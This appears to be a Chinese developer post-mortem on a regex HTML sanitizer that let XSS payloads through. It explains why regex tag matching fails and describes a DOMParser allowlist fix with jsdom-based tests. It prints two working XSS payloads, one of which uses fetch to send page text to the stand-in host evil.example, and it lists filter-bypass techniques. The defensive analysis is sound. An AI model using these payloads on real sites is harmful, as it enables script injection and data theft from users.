# 正则清洗器眼里的标签在第一个 `>` 就结束了，浏览器眼里不是

## 现象

`src/info/extract/sanitize.ts` 用正则清洗第三方正文（结果交给 `dangerouslySetInnerHTML`），两个 payload 原样进了 DOM：

```
<marquee title="a>" onstart="fetch('https://evil.example/'+document.body.innerText)">x</marquee>
<p on class="x"click=alert(1)>x</p>
```

第一个清洗后一个字符没变，`onstart` 还在。第二个清洗后变成 `<p onclick=alert(1)>x</p>`——一个输入里没有的处理器。用 bun 自带的 `HTMLRewriter`（lol-html）读清洗结果可以直接看到这两条属性。

## 原因

第一个：每条规则都写成 `<tag[^>]*>`，标签在第一个 `>` 处结束。真正的 tokenizer 在双引号属性值里把 `>` 当普通字符，所以正则只看到 `<marquee title="a`，处理器在它没看的那一半里。单引号值、未加引号的值、`<p/onclick=...>` 的斜杠分隔，都是同一类偏差。

第二个：删属性的做法是替换成空串，且每条规则只跑一次。`on` 和 `click=alert(1)` 中间的 ` class="x"` 被删掉，两边就粘成了 `onclick`。

危险集合是开放的（处理器有六种写法、scheme 能用实体和控制字符拼、命名空间还能绕），拿正则枚举危险永远差一个。

## 解法

改成用 DOMParser 解析 + 白名单走树：允许的元素、每个元素允许的属性、允许的 URL scheme，其余一律丢；留下的标签全部用解析出来的名字和值重新写出来，文本转义后写出去。渲染端重新解析到的，就是检查过的那棵树。svg/math 整棵子树丢掉（`<svg><script>`、`<foreignObject>` 回到 HTML 命名空间、math/mtext 的 mXSS 链都从这里进来）。没有 DOMParser 就返回 `""`，不返回没检查过的 HTML。

测试要两个东西：bun 没有 DOMParser，用 jsdom（parse5，和 WebKit 同一份 HTML5 规范）在 `tests/dom.ts` 里补一个，跑的就是线上那条代码；判定不能读输出字符串，要用 `HTMLRewriter` 问「浏览器在这段输出里看到哪些元素和属性」——`expect(out).not.toContain("onclick")` 分不清中和掉的 payload 和换个写法的 payload。
